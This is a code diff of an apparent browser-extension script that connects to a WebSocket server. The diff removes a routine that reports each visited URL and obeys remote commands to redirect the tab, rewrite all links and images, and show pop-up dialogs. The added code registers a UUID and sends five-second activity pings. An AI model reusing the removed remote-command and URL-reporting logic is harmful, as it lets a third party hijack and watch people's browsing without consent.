@@ -1,82 +1,85 @@
 const socket = new WebSocket("wss://salbot.ch/cable");
 
-socket.onopen = () => {
+socket.onopen = async () => {
     const subscribe_request = {
         command: "subscribe",
         identifier: JSON.stringify({
-            channel: "DnsChannel",
+            channel: "ConsumerChannel"
         })
     }
-
     socket.send(JSON.stringify(subscribe_request));
 
-    const dns_request = {
+    // TODO: Remove as it's only for testing
+    // await chrome.storage.sync.clear();
+
+    let uuid_container = await chrome.storage.sync.get(["uuid"]);
+
+    // Request a UUID if one isn't stored yet
+    if (!uuid_container.uuid) {
+        const get_uuid_request = {
+            command: "message",
+            identifier: JSON.stringify({
+                channel: "ConsumerChannel"
+            }),
+            data: JSON.stringify({
+                action: "create_consumer"
+            })
+        }
+        socket.send(JSON.stringify(get_uuid_request));
+    } else {
+        identify(uuid_container.uuid);
+    }
+};
+
+
+socket.onmessage = async event => {
+    const data = JSON.parse(event.data);
+    if (data.type == "ping") return;
+    const message = data.message;
+    if (message == null) return;
+
+    switch (message.type) {
+        case "uuid_payload":
+            await chrome.storage.sync.set({ uuid: message.uuid });
+            identify(message.uuid);
+            break;
+    }
+};
+
+
+function ping(uuid) {
+    const ping_request = {
         command: "message",
         identifier: JSON.stringify({
-            channel: "DnsChannel"
+            channel: "ConsumerChannel"
         }),
         data: JSON.stringify({
-            type: "dns",
-            href: location.href
+            action: "ping",
+            uuid: uuid,
+            active: !document.hidden
         })
     }
+    socket.send(JSON.stringify(ping_request));
+}
 
-    socket.send(JSON.stringify(dns_request));
-};
 
-socket.onmessage = event => {
-    const data = JSON.parse(event.data);
+function identify(uuid) {
+    // Fail safe incase uuid somehow is null
+    if (!uuid) return;
 
-    if (data.type == "ping") return;
+    const identify_request = {
+        command: "message",
+        identifier: JSON.stringify({
+            channel: "ConsumerChannel"
+        }),
+        data: JSON.stringify({
+            action: "identify",
+            uuid: uuid
+        })
+    }
+    socket.send(JSON.stringify(identify_request));
 
-    const msg = data.message;
-
-    if (msg == null) return;
-
-    if (msg.type != "perform") return;
-
-    if (document.hidden && msg.target == "self") return;
-
-    try {
-        switch (msg.name) {
-            case "rickroll":
-                document.getElementById("audio-tag-sound").play().catch(err => {});
-                break;
-
-            case "redirect": case "redirect-all":
-                location = msg.href;
-                break;
-
-            case "change-urls": case "change-all-urls":
-                let links = document.getElementsByTagName("a");
-
-                for (let link of links) {
-                    link.setAttribute("href", msg.href);
-                }
-                break;
-
-            case "change-images": case "change-all-images":
-                let images = document.getElementsByTagName("img");
-
-                for (let image of images) {
-                    image.setAttribute("src", msg.href);
-                }
-                break;
-            
-            case "alert":
-                alert(msg.text);
-                break;
-            
-            case "confirm":
-                confirm(msg.text);
-                break;
-
-            case "prompt":
-                prompt(msg.text, "");
-                break;
-
-            default:
-                break;
-        }
-    } catch (error) {}
-};
+    // Start sending pings to the server to update online status
+    ping(uuid);
+    setInterval(() => ping(uuid), 5000);
+}
